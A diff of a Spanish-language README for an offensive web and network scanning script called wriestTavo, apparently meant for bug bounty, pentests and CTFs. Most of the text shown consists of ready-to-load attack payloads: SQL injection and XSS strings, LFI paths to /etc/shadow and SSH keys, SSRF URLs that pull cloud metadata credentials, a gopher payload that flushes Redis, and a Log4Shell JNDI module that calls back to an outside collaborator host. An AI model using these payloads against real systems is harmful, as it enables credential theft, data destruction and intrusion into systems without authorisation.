+sudo ./wriestTavo.sh --add-payload "/var/log/auth.log" --payload-type lfi
+sudo ./wriestTavo.sh --add-payload "/var/log/mail.log" --payload-type lfi
+sudo ./wriestTavo.sh --add-payload "/usr/local/apache/log/error_log" --payload-type lfi
+sudo ./wriestTavo.sh --add-payload "/proc/self/fd/2" --payload-type lfi
+```
+
+### SSRF (~35 nuevos)
+
+```bash
+# ─── Cloud Metadata ────────────────────────────────────────────
+# AWS
+sudo ./wriestTavo.sh --add-payload "http://169.254.169.254/latest/meta-data/iam/security-credentials/" --payload-type ssrf
+sudo ./wriestTavo.sh --add-payload "http://169.254.169.254/latest/user-data/" --payload-type ssrf
+sudo ./wriestTavo.sh --add-payload "http://169.254.169.254/latest/dynamic/instance-identity/document" --payload-type ssrf
+# GCP
+sudo ./wriestTavo.sh --add-payload "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" --payload-type ssrf
+sudo ./wriestTavo.sh --add-payload "http://metadata.google.internal/computeMetadata/v1/project/project-id" --payload-type ssrf
+# Azure
+sudo ./wriestTavo.sh --add-payload "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" --payload-type ssrf
+sudo ./wriestTavo.sh --add-payload "http://169.254.169.254/metadata/instance?api-version=2021-02-01" --payload-type ssrf
+# DigitalOcean
+sudo ./wriestTavo.sh --add-payload "http://169.254.169.254/metadata/v1.json" --payload-type ssrf
+
+# ─── Servicios Internos ────────────────────────────────────────
+sudo ./wriestTavo.sh --add-payload "http://kubernetes.default.svc/api/v1/namespaces" --payload-type ssrf
+sudo ./wriestTavo.sh --add-payload "http://127.0.0.1:9200/_cat/indices" --payload-type ssrf    # Elasticsearch
+sudo ./wriestTavo.sh --add-payload "http://127.0.0.1:6379/info" --payload-type ssrf             # Redis
+sudo ./wriestTavo.sh --add-payload "http://127.0.0.1:2375/v1.41/containers/json" --payload-type ssrf  # Docker API
+sudo ./wriestTavo.sh --add-payload "http://127.0.0.1:9090/api/v1/query?query=up" --payload-type ssrf  # Prometheus
+sudo ./wriestTavo.sh --add-payload "http://127.0.0.1:8080/api/json" --payload-type ssrf          # Jenkins
+sudo ./wriestTavo.sh --add-payload "http://127.0.0.1:8080/script" --payload-type ssrf            # Jenkins Groovy
+
+# ─── Bypass de Filtros (blacklist de 127.0.0.1) ────────────────
+sudo ./wriestTavo.sh --add-payload "http://0x7f000001/" --payload-type ssrf
+sudo ./wriestTavo.sh --add-payload "http://2130706433/" --payload-type ssrf
+sudo ./wriestTavo.sh --add-payload "http://127.1/" --payload-type ssrf
+sudo ./wriestTavo.sh --add-payload "http://[::1]/" --payload-type ssrf
+sudo ./wriestTavo.sh --add-payload "http://[::ffff:127.0.0.1]/" --payload-type ssrf
+sudo ./wriestTavo.sh --add-payload "http://localhost./" --payload-type ssrf
+sudo ./wriestTavo.sh --add-payload "http://localtest.me/" --payload-type ssrf
+# Protocolos alternativos
+sudo ./wriestTavo.sh --add-payload "dict://127.0.0.1:6379/info" --payload-type ssrf
+sudo ./wriestTavo.sh --add-payload "gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall" --payload-type ssrf
+sudo ./wriestTavo.sh --add-payload "file:///etc/passwd" --payload-type ssrf
+# Open redirect bypass
+sudo ./wriestTavo.sh --add-payload "https://target.com@169.254.169.254/" --payload-type ssrf
+sudo ./wriestTavo.sh --add-payload "https://169.254.169.254#@target.com/" --payload-type ssrf
+```
+
+### Rutas / Paths (~60 nuevos)
+
+```bash
+# ─── Archivos de Entorno ───────────────────────────────────────
+sudo ./wriestTavo.sh --add-payload "/.env" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/.env.local" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/.env.production" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/.env.backup" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/.env.old" --payload-type paths
+
+# ─── Git / SVN ─────────────────────────────────────────────────
+sudo ./wriestTavo.sh --add-payload "/.git/config" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/.git/HEAD" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/.git/refs/heads/main" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/.svn/entries" --payload-type paths
+
+# ─── Spring Boot Actuator ──────────────────────────────────────
+sudo ./wriestTavo.sh --add-payload "/actuator" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/actuator/env" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/actuator/heapdump" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/actuator/beans" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/actuator/mappings" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/actuator/httptrace" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/actuator/logfile" --payload-type paths
+
+# ─── Swagger / OpenAPI ─────────────────────────────────────────
+sudo ./wriestTavo.sh --add-payload "/swagger-ui.html" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/v2/api-docs" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/v3/api-docs" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/openapi.json" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/openapi.yaml" --payload-type paths
+
+# ─── GraphQL ───────────────────────────────────────────────────
+sudo ./wriestTavo.sh --add-payload "/graphiql" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/playground" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/api/graphql" --payload-type paths
+
+# ─── Cloud / DevOps ────────────────────────────────────────────
+sudo ./wriestTavo.sh --add-payload "/.aws/credentials" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/.aws/config" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/terraform.tfstate" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/terraform.tfvars" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/docker-compose.yml" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/.kube/config" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/.github/workflows/deploy.yml" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/.gitlab-ci.yml" --payload-type paths
+
+# ─── Frameworks Frontend ───────────────────────────────────────
+sudo ./wriestTavo.sh --add-payload "/_next/static/chunks/pages/_app.js" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/_next/data/" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/_nuxt/manifest.json" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/@vite/client" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/vite.config.js" --payload-type paths
+
+# ─── Debug y Logs ──────────────────────────────────────────────
+sudo ./wriestTavo.sh --add-payload "/phpinfo.php" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/server-status" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/server-info" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/error_log" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/storage/logs/laravel.log" --payload-type paths
+
+# ─── Paneles de Admin ──────────────────────────────────────────
+sudo ./wriestTavo.sh --add-payload "/phpmyadmin" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/manager/html" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/kibana" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/grafana" --payload-type paths
+sudo ./wriestTavo.sh --add-payload "/sonarqube" --payload-type paths
+```
+
+### ⚡ Bloque Completo — Cargar todos de una vez
+
+```bash
+#!/bin/bash
+# Guardar como: cargar_payloads_modernos.sh
+# Uso: bash cargar_payloads_modernos.sh
+SCRIPT="./wriestTavo.sh"
+
+echo "[*] Cargando SQLi..."
+sudo $SCRIPT --add-payload "' OR 1=1 LIMIT 1 OFFSET 0--" --payload-type sqli
+sudo $SCRIPT --add-payload "' OR 1=1#" --payload-type sqli
+sudo $SCRIPT --add-payload "') OR ('1'='1" --payload-type sqli
+sudo $SCRIPT --add-payload "1' AND (SELECT SLEEP(3))--" --payload-type sqli
+sudo $SCRIPT --add-payload "'; WAITFOR DELAY '0:0:3'--" --payload-type sqli
+sudo $SCRIPT --add-payload "'; SELECT pg_sleep(3)--" --payload-type sqli
+sudo $SCRIPT --add-payload "' UNION SELECT @@version,NULL,NULL--" --payload-type sqli
+sudo $SCRIPT --add-payload "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--" --payload-type sqli
+sudo $SCRIPT --add-payload "'/**/OR/**/1=1--" --payload-type sqli
+sudo $SCRIPT --add-payload "' /*!OR*/ 1=1--" --payload-type sqli
+sudo $SCRIPT --add-payload "'%09OR%091=1--" --payload-type sqli
+sudo $SCRIPT --add-payload "' UNION SELECT table_name,NULL FROM information_schema.tables--" --payload-type sqli
+
+echo "[*] Cargando XSS..."
+sudo $SCRIPT --add-payload "<svg onload=alert(1)>" --payload-type xss
+sudo $SCRIPT --add-payload "<svg/onload=alert(1)>" --payload-type xss
+sudo $SCRIPT --add-payload "<input autofocus onfocus=alert(1)>" --payload-type xss
+sudo $SCRIPT --add-payload "<details open ontoggle=alert(1)>" --payload-type xss
+sudo $SCRIPT --add-payload "<math href=javascript:alert(1)>click</math>" --payload-type xss
+sudo $SCRIPT --add-payload "{{constructor.constructor('alert(1)')()}}" --payload-type xss
+sudo $SCRIPT --add-payload "%253Cscript%253Ealert(1)%253C%252Fscript%253E" --payload-type xss
+sudo $SCRIPT --add-payload "<img src=1 onerror=alert(document.cookie)>" --payload-type xss
+
+echo "[*] Cargando LFI..."
+sudo $SCRIPT --add-payload "/etc/shadow" --payload-type lfi
+sudo $SCRIPT --add-payload "/root/.ssh/id_rsa" --payload-type lfi
+sudo $SCRIPT --add-payload "/var/run/secrets/kubernetes.io/serviceaccount/token" --payload-type lfi
+sudo $SCRIPT --add-payload "/proc/1/environ" --payload-type lfi
+sudo $SCRIPT --add-payload "php://filter/convert.base64-encode/resource=config.php" --payload-type lfi
+sudo $SCRIPT --add-payload "/../../../.env" --payload-type lfi
+sudo $SCRIPT --add-payload "/config/database.yml" --payload-type lfi
+sudo $SCRIPT --add-payload "/WEB-INF/web.xml" --payload-type lfi
+sudo $SCRIPT --add-payload "/appsettings.json" --payload-type lfi
+sudo $SCRIPT --add-payload "/var/log/auth.log" --payload-type lfi
+
+echo "[*] Cargando SSRF..."
+sudo $SCRIPT --add-payload "http://169.254.169.254/latest/meta-data/iam/security-credentials/" --payload-type ssrf
+sudo $SCRIPT --add-payload "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" --payload-type ssrf
+sudo $SCRIPT --add-payload "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" --payload-type ssrf
+sudo $SCRIPT --add-payload "http://kubernetes.default.svc/api/v1/namespaces" --payload-type ssrf
+sudo $SCRIPT --add-payload "http://127.0.0.1:9200/_cat/indices" --payload-type ssrf
+sudo $SCRIPT --add-payload "http://0x7f000001/" --payload-type ssrf
+sudo $SCRIPT --add-payload "http://[::1]/" --payload-type ssrf
+sudo $SCRIPT --add-payload "dict://127.0.0.1:6379/info" --payload-type ssrf
+sudo $SCRIPT --add-payload "http://127.0.0.1:2375/v1.41/containers/json" --payload-type ssrf
+
+echo "[*] Cargando paths..."
+sudo $SCRIPT --add-payload "/.env" --payload-type paths
+sudo $SCRIPT --add-payload "/.env.production" --payload-type paths
+sudo $SCRIPT --add-payload "/.git/config" --payload-type paths
+sudo $SCRIPT --add-payload "/actuator/env" --payload-type paths
+sudo $SCRIPT --add-payload "/actuator/heapdump" --payload-type paths
+sudo $SCRIPT --add-payload "/swagger-ui.html" --payload-type paths
+sudo $SCRIPT --add-payload "/v3/api-docs" --payload-type paths
+sudo $SCRIPT --add-payload "/terraform.tfstate" --payload-type paths
+sudo $SCRIPT --add-payload "/.aws/credentials" --payload-type paths
+sudo $SCRIPT --add-payload "/docker-compose.yml" --payload-type paths
+sudo $SCRIPT --add-payload "/@vite/client" --payload-type paths
+sudo $SCRIPT --add-payload "/graphiql" --payload-type paths
+
+echo "[+] Listo. Verificar con: sudo ./wriestTavo.sh --show-cves"
+```
+
+### Resumen de Totales
+
+| Tipo | En esta lista | Ya en el script | Total combinado |
+|------|--------------|-----------------|----------------|
+| SQLi | ~45 nuevos | 14 base | ~59 |
+| XSS | ~35 nuevos | 14 base | ~49 |
+| LFI | ~40 nuevos | 20 base | ~60 |
+| SSRF | ~35 nuevos | 6 base | ~41 |
+| Paths | ~60 nuevos | 0 (usa SecLists) | ~60 |
+| **Total** | **~215 nuevos** | **54 base** | **~269** |
 
 ---
 
 ## Agregar Módulos Propios
 
-WriestTavo tiene un sistema de plugins. Puedes agregar módulos completamente nuevos sin tocar el script original.
-
-### Estructura de Directorios
-
-```
-~/.wriestTavo/
-├── custom_payloads/
-│   ├── sqli_extra.txt
-│   ├── xss_extra.txt
-│   ├── lfi_extra.txt
-│   ├── ssrf_extra.txt
-│   └── paths_extra.txt
-├── modules/                    ← TUS MÓDULOS AQUÍ
-│   ├── modulo_log4shell.sh
-│   ├── modulo_polyfill.sh
-│   └── modulo_mi_vuln_nueva.sh
-├── edb_cache/
-└── cve_cache/
+```bash
+# Los módulos custom se cargan automáticamente al existir en:
+~/.wriestTavo/modules/modulo_*.sh
 ```
 
-### Plantilla de Módulo Custom
+### Plantilla de módulo
 
 ```bash
-# Archivo: ~/.wriestTavo/modules/modulo_mi_vuln.sh
+#!/bin/bash
+# modulo_log4shell.sh — CVE-2021-44228 Log4Shell
 
-modulo_mi_vuln() {
-    # ── Condición de activación (opcional) ──
-    # Solo ejecutar si detectamos algo relevante
-    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return
-    [[ ! " ${INTEL_TECHNOLOGIES[*]} " =~ " php " ]] && {
-        warn "Mi vuln: PHP no detectado. Saltar."
-        return
-    }
-
-    log "MÓDULO CUSTOM: Mi Vulnerabilidad Nueva"
-    tip "Descripción de qué hace y por qué importa."
-
-    # ── Variables locales ──
-    local proto="http"
-    local port="${WEB_PORTS[0]}"
-    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
-    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
-    local out_file="${OUTPUT_DIR}/web/mi_vuln_results.txt"
-
-    echo "Mi Vuln — $(date)" > "$out_file"
-
-    # ── Respetar delay de WAF ──
-    local delay=0
-    [[ "$INTEL_WAF_DETECTED" == "true" ]] && delay="${INTEL_SCAN_DELAY}"
-
-    # ── Tu lógica de prueba aquí ──
-    local resp
-    resp=$(curl -skL --max-time 10 "${base_url}/ruta-especifica" 2>/dev/null)
-
-    if echo "$resp" | grep -qiE "patron_de_vulnerabilidad|error_especifico"; then
-        # ── Guardar en INTEL para que otros módulos lo usen ──
-        INTEL_SENSITIVE_PATHS+=("${base_url}/ruta-especifica")
-
-        # ── Reportar hallazgo ──
-        # add_finding SEVERIDAD TÍTULO DETALLE CVSS REMEDIACIÓN SIGUIENTE_PASO
-        add_finding "CRÍTICO" \
-            "Mi Vulnerabilidad Nueva Confirmada" \
-            "<b>URL:</b> ${base_url}/ruta-especifica<br><b>Evidencia:</b><pre>${resp:0:300}</pre>" \
-            "9.8" \
-            "Actualizar a la versión parcheada. Aplicar workaround X." \
-            "Explotar con: curl -X POST '${base_url}/ruta' -d 'payload=PAYLOAD'"
-
-        intel_log "MI_VULN confirmada en ${base_url}"
-        echo "VULN: ${base_url}/ruta-especifica" >> "$out_file"
-    else
-        ok "Mi vuln: no detectada en este target."
-    fi
-
-    [[ "$delay" -gt 0 ]] && sleep "0.${delay}"
-    echo
-}
-```
-
-### Cargar el Módulo
-
-Los módulos custom se cargan **automáticamente** cada vez que ejecutas el script:
-```bash
-# Al ejecutar el scan, verás:
-# [INFO] Módulo custom cargado: modulo_mi_vuln.sh
-
-# Para ejecutarlo manualmente (opción 11 → Custom):
-sudo ./wriestTavo.sh target.com
-# → [11] Custom
-# → escribir el nombre (si lo agregaste al case) o ejecutarlo con:
-source ~/.wriestTavo/modules/modulo_mi_vuln.sh && modulo_mi_vuln
-```
-
-### Agregar al Menú Custom (opcional)
-
-Para que aparezca en el menú [11] Custom, agrega al script principal:
-
-```bash
-# En el bloque case dentro de menu_custom():
-# Busca la línea: 43) modulo_edb_intel ;; ...
-# Y agrega:
-45) modulo_mi_vuln ;;
-```
-
-### Ejemplos de Módulos Custom Útiles
-
-#### Log4Shell (CVE-2021-44228)
-```bash
-# ~/.wriestTavo/modules/modulo_log4shell.sh
 modulo_log4shell() {
-    [[ ! " ${INTEL_TECHNOLOGIES[*]} " =~ " java " ]] && return
-    log "CUSTOM: Log4Shell (CVE-2021-44228)"
+    # Solo si Java/Spring detectado
+    echo "${INTEL_TECHNOLOGIES[@]}" | grep -qi "java\|spring" || return
 
-    local callback_url="http://TU-BURP-COLLABORATOR"
-    local payload="\${jndi:ldap://${callback_url}/log4shell}"
+    log "MÓDULO CUSTOM: Log4Shell (CVE-2021-44228)"
+    tip "Prueba inyección JNDI en headers HTTP."
 
-    curl -skL --max-time 10 \
+    local out="${OUTPUT_DIR}/web/log4shell.txt"
+    local collab="TU-BURP-COLLABORATOR.burpcollaborator.net"
+    local proto="${WEB_PORTS[0]:-80}"
+    [[ "${WEB_PORTS[0]}" == "443" ]] && proto="https" || proto="http"
+    local base_url="${proto}://${TARGET}"
+
+    # Respetar delay de WAF
+    sleep "${INTEL_SCAN_DELAY:-0}"
+
+    local payload="\${jndi:ldap://${collab}/log4shell}"
+    curl -sk --max-time 10 "${base_url}" \
         -H "X-Api-Version: ${payload}" \
         -H "User-Agent: ${payload}" \
-        "${ORIGINAL_URL:-http://${TARGET}}/" >/dev/null 2>&1
+        -H "X-Forwarded-For: ${payload}" \
+        >> "$out" 2>&1
 
-    add_finding "INFO" "Log4Shell Test Enviado" \
-        "Payload JNDI enviado. Verificar en Burp Collaborator si hubo callback." \
+    add_finding "CRÍTICO" "Log4Shell CVE-2021-44228 Potencial" \
+        "Payload JNDI enviado en headers. Verificar callback en Burp Collaborator." \
         "10.0" \
-        "Actualizar log4j a 2.17.1+. Deshabilitar JNDI lookup." \
-        "Ver callback en: ${callback_url}"
-    echo
-}
-```
-
-#### Polyfill.io Supply Chain
-```bash
-# ~/.wriestTavo/modules/modulo_polyfill.sh
-modulo_polyfill() {
-    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return
-    log "CUSTOM: Polyfill.io Supply Chain Check"
-
-    local resp
-    resp=$(curl -skL --max-time 10 "${ORIGINAL_URL:-http://${TARGET}}/" 2>/dev/null)
-
-    if echo "$resp" | grep -q "polyfill.io"; then
-        add_finding "ALTO" "Polyfill.io Detectado" \
-            "El sitio carga scripts de polyfill.io (dominio comprometido en 2024)." \
-            "8.0" \
-            "Reemplazar polyfill.io con cdn.jsdelivr.net/npm/core-js o auto-hospedar." \
-            "Ver: https://sansec.io/research/polyfill-supply-chain-attack"
-    fi
-    echo
+        "Actualizar Log4j a 2.17.1+. Establecer log4j2.formatMsgNoLookups=true." \
+        "nuclei -u ${base_url} -t cves/2021/CVE-2021-44228.yaml"
 }
 ```
 
@@ -703,179 +1105,76 @@ modulo_polyfill() {
 
 ## Exploit Intelligence
 
-El módulo 43 y 44 conectan WriestTavo con bases de datos de exploits en tiempo real.
+### Módulo 43 — Automático (al final del scan)
 
-### Módulo 43 — EDB Intel (automático)
+4 búsquedas paralelas cruzadas con el stack detectado:
 
-Se ejecuta automáticamente al final de cada Full Scan. Hace 4 búsquedas en paralelo:
+1. **searchsploit local** — filtra por impacto (RCE > SQLi > Auth Bypass), detecta MSF
+2. **EDB online** — últimos 30 días, caché 24h, badges Verified/NEW
+3. **NVD CVEs** — CVSS≥9.0 por tecnología, si CVE tiene ref a EDB → badge 🎯
+4. **GHSA** — por ecosistema (composer/pip/npm/rubygems según framework)
 
-**[1] searchsploit local (offline)**
-```bash
-# Lo que hace internamente, según el stack detectado:
-searchsploit "php rce" --json          # si PHP detectado
-searchsploit "laravel" --json          # si Laravel detectado
-searchsploit "wordpress plugin rce" --json  # si WordPress
-searchsploit "redis unauthenticated" --json # si Redis
-# Filtra por impacto: RCE > SQLi > Auth Bypass > LFI
-# Muestra badge MSF si tiene módulo Metasploit
-```
-
-**[2] Exploit-DB Online (últimos 30 días)**
-```bash
-# Primero intenta la API de EDB
-POST https://www.exploit-db.com/search
-
-# Si falla, usa el CSV de GitLab (actualizado en tiempo real):
-https://gitlab.com/exploit-database/exploitdb/-/raw/main/files_exploits.csv
-# Filtra por keyword del stack + fecha >= 30 días atrás
-# Caché de 24h para no saturar
-```
-
-**[3] NVD CVEs críticos**
-```bash
-# Por cada tecnología detectada, busca en NVD:
-https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=TECH&cvssV3Severity=CRITICAL
-# Muestra CVE-ID, CVSS score, descripción, fecha
-# Si el CVE tiene referencia a EDB → badge "🎯 EDB" con link directo
-```
-
-**[4] GitHub Advisory Database (GHSA)**
-```bash
-# Según framework detectado:
-# Laravel/Symfony → composer advisories
-# Django/Flask/FastAPI → pip advisories
-# Express/NestJS/Next.js → npm advisories
-# Ruby on Rails → rubygems advisories
-https://api.github.com/advisories?ecosystem=ECOSYSTEM
-```
-
-### Módulo 44 — Búsqueda Manual
+### Módulo 44 — Manual (búsqueda interactiva)
 
 ```bash
-# Desde el menú [11] Custom, seleccionar [44]
-# El script te pregunta qué buscar:
-🔍 Buscar en Exploit-DB + NVD: wordpress 5.8
-
-# Muestra:
-# - Resultados de searchsploit con colores
-# - Link directo a EDB online
-# - CVEs en NVD
-# - Link a GHSA
-# - Link a Metasploit DB (Rapid7)
+sudo ./wriestTavo.sh TARGET
+# → [44] EDB Búsqueda
+# Ingresa término: "apache rce" → links directos a EDB, NVD, GHSA, MSF
 ```
-
-### Actualizar la Base de searchsploit
-
-```bash
-# Actualizar base de datos local de Exploit-DB
-sudo searchsploit --update
-
-# Buscar manualmente
-searchsploit php rce
-searchsploit wordpress 5.8 --json
-searchsploit -x 12345    # leer exploit #12345
-searchsploit -m 12345    # copiar exploit a directorio actual
-```
-
----
-
-## El Reporte HTML
-
-Al terminar el scan, se genera un archivo `.html` interactivo en el directorio de output.
-
-```
-wriestTavo_results/
-└── reporte_192_168_1_100_20241215_143022.html
-```
-
-### Secciones del Reporte
-
-**1. Resumen Ejecutivo (para Dirección)**
-- Texto no técnico con impacto de negocio
-- Nivel de riesgo global con CVSS promedio
-- Tres secciones: Acción Inmediata / Próximo Sprint / Backlog
-
-**2. Dashboard de Vulnerabilidades**
-- Tarjetas con conteo: Crítico / Alto / Medio / Bajo / Info
-- Tarjeta CVSS Promedio del scan
-- Los hallazgos CRÍTICOS y ALTOS se abren solos al cargar
-
-**3. Contexto INTEL (Brain Box)**
-- OS detectado, WAF, CMS, Framework JS, Framework Backend
-- Tecnologías detectadas, servicios
-- SQLi/XSS/SSRF/CORS/Docker/K8s status
-- Cloud provider detectado
-
-**4. Hallazgos Detallados**
-- Filtros interactivos por severidad
-- Cada hallazgo incluye:
-  - Badge de severidad (CRÍTICO/ALTO/MEDIO/BAJO/INFO)
-  - **CVSS score** con color (rojo ≥9, naranja ≥7, amarillo ≥4)
-  - Descripción técnica
-  - 🔧 **Cómo Corregir** (remediación exacta)
-  - ➡️ **Siguiente Paso** (comando listo para ejecutar)
-
-**5. Exploit Intelligence**
-- Tabla EDB con links directos
-- Badge MSF (Metasploit) y Verified
-- CVEs NVD con CVSS y links
-- GitHub Advisories
-
-**6. Archivos Generados**
-- Lista de todos los outputs: nmap, gobuster, nikto, sqlmap, etc.
 
 ---
 
 ## Flujo Completo de Trabajo
 
-### Bug Bounty — Workflow Recomendado
+### Bug Bounty
 
 ```bash
-# Día 1: Reconocimiento
+# Día 1: Reconocimiento silencioso
 sudo ./wriestTavo.sh --mode stealth https://target.hackerone.com
-# → Seleccionar [2] Recon OSINT
-# → Recolectar subdominios, emails, DNS
+# → [2] Recon OSINT
 
-# Día 1: Scan web profundo (en paralelo)
+# Día 1: Bug Bounty Pro
 sudo ./wriestTavo.sh --mode stealth https://target.hackerone.com
-# → Seleccionar [4] Bug Bounty Pro
+# → [4] Bug Bounty Pro
 
-# Cuando encuentras algo interesante: agregar payload específico
+# Agregar payloads de writeups recientes
 sudo ./wriestTavo.sh --add-payload "PAYLOAD_DEL_WRITEUP" --payload-type sqli
 
 # Día 2: Rescan con payloads nuevos
 sudo ./wriestTavo.sh https://target.hackerone.com
-# → Seleccionar [11] Custom → [13] SQLi [14] XSS [31] LFI
+# → [11] Custom → [13] SQLi [14] XSS [31] LFI
 
-# Ver exploit intel del stack
-sudo ./wriestTavo.sh --show-cves
+# Ver reportes
+firefox wriestTavo_results/reporte_CLIENTE_*.html     # Para el cliente
+firefox wriestTavo_results/reporte_PENTESTER_*.html   # Para el analista
 ```
 
-### Pentesting Interno — Workflow
+### Pentesting Interno / AD
 
 ```bash
-# Full scan completo
-sudo ./wriestTavo.sh --mode normal 192.168.1.0/24  # o IP específica
-# → Seleccionar [1] Full Scan
-
-# Windows/AD específico
+# Full scan + AD
 sudo ./wriestTavo.sh 192.168.1.100
-# → Seleccionar [7] Windows/Infra
+# → [1] Full Scan  (incluye ADPulse automáticamente al detectar LDAP/SMB)
 
-# Verificar infra moderna
-sudo ./wriestTavo.sh 192.168.1.100
-# → Seleccionar [11] Custom → [38] Docker/K8s
+# O solo AD audit
+sudo ./wriestTavo.sh 192.168.1.10
+# → [7] Windows/Infra + AD
+# → Introduce credenciales de solo lectura cuando pida ADPulse
+
+# Abrir reportes diferenciados
+firefox wriestTavo_results/reporte_CLIENTE_*.html     # Para el CISO/IT
+firefox wriestTavo_results/reporte_CENSURADO_*.html   # Para Dirección/Legal
+firefox wriestTavo_results/reporte_PENTESTER_*.html   # Para el equipo técnico
 ```
 
-### CTF / HackTheBox — Workflow
+### CTF / HackTheBox
 
 ```bash
-# Máxima cobertura sin restricciones
 sudo ./wriestTavo.sh --mode aggressive 10.10.10.X
-# → Seleccionar [10] CTF/HTB Mode
+# → [10] CTF/HTB Mode
 
-# Ver reporte inmediatamente
-firefox wriestTavo_results/reporte_*.html
+# Ver reporte pentester inmediatamente
+firefox wriestTavo_results/reporte_PENTESTER_*.html
 ```
 
 ---
@@ -886,15 +1185,15 @@ firefox wriestTavo_results/reporte_*.html
 # ── ESCANEOS ──────────────────────────────────────────────────
 sudo ./wriestTavo.sh IP_o_DOMINIO                    # Scan básico
 sudo ./wriestTavo.sh https://app.example.com         # URL completa
-sudo ./wriestTavo.sh --mode stealth target.com       # Modo silencioso
-sudo ./wriestTavo.sh --mode aggressive 10.10.10.X    # Modo agresivo CTF
-sudo ./wriestTavo.sh -o /tmp/mi_scan target.com      # Output personalizado
+sudo ./wriestTavo.sh --mode stealth target.com       # Silencioso
+sudo ./wriestTavo.sh --mode aggressive 10.10.10.X    # Agresivo CTF
+sudo ./wriestTavo.sh -o /tmp/mi_scan target.com      # Output custom
 
 # ── MANTENIMIENTO ─────────────────────────────────────────────
 sudo ./wriestTavo.sh --update                        # Actualizar TODO
-sudo ./wriestTavo.sh --install                       # Instalar dependencias
-sudo ./wriestTavo.sh --cron                          # Auto-update diario 6am
-sudo ./wriestTavo.sh --show-cves                     # Ver CVEs y payloads cached
+sudo ./wriestTavo.sh --install                       # Instalar deps
+sudo ./wriestTavo.sh --cron                          # Auto-update 6am
+sudo ./wriestTavo.sh --show-cves                     # Ver CVEs cacheados
 
 # ── PAYLOADS CUSTOM ───────────────────────────────────────────
 sudo ./wriestTavo.sh --add-payload "PAYLOAD" --payload-type sqli
@@ -904,30 +1203,30 @@ sudo ./wriestTavo.sh --add-payload "PAYLOAD" --payload-type ssrf
 sudo ./wriestTavo.sh --add-payload "PAYLOAD" --payload-type paths
 nano ~/.wriestTavo/custom_payloads/sqli_extra.txt    # Editar directo
 
-# ── EXPLOIT DATABASE ──────────────────────────────────────────
-sudo searchsploit --update                           # Actualizar BD local
-searchsploit php rce                                 # Buscar por keyword
-searchsploit -x 12345                                # Leer exploit
-searchsploit -m 12345                                # Copiar exploit
-searchsploit wordpress 5.8 --json | jq              # JSON output
+# ── REPORTES ──────────────────────────────────────────────────
+firefox wriestTavo_results/reporte_CLIENTE_*.html     # Ejecutivo IT
+firefox wriestTavo_results/reporte_CENSURADO_*.html   # Versión privacidad
+firefox wriestTavo_results/reporte_PENTESTER_*.html   # Técnico completo
+# Todos a la vez:
+for f in wriestTavo_results/reporte_*.html; do firefox "$f" &; done
 
-# ── MÓDULOS CUSTOM ────────────────────────────────────────────
-ls ~/.wriestTavo/modules/                            # Ver módulos instalados
-nano ~/.wriestTavo/modules/modulo_nuevo.sh           # Crear módulo
-bash -n ~/.wriestTavo/modules/modulo_nuevo.sh        # Validar sintaxis
+# ── ADPULSE ───────────────────────────────────────────────────
+# Seleccionar [45] desde menú custom, [7] Windows/Infra, o [10] CTF
+# Después del scan AD:
+cat wriestTavo_results/active_directory/all_users.txt
+cat wriestTavo_results/active_directory/kerberoastable.txt
+ls wriestTavo_results/active_directory/bloodhound/
+
+# ── EXPLOIT DATABASE ──────────────────────────────────────────
+sudo searchsploit --update
+searchsploit php rce
+searchsploit -x 12345                                # Leer exploit
+searchsploit wordpress 5.8 --json | jq
 
 # ── NUCLEI ────────────────────────────────────────────────────
-nuclei -update-templates                             # Actualizar templates
-nuclei -l urls.txt -t cves/                          # Solo CVEs
-nuclei -u https://target.com -t exposures/           # Exposures
-nuclei -u https://target.com -severity critical,high # Solo alto impacto
-
-# ── OTRAS HERRAMIENTAS INTEGRADAS ─────────────────────────────
-wpscan --url https://wp-site.com --enumerate ap,at,u # WordPress audit
-sqlmap -u "URL?id=1" --dbs                           # SQLi manual
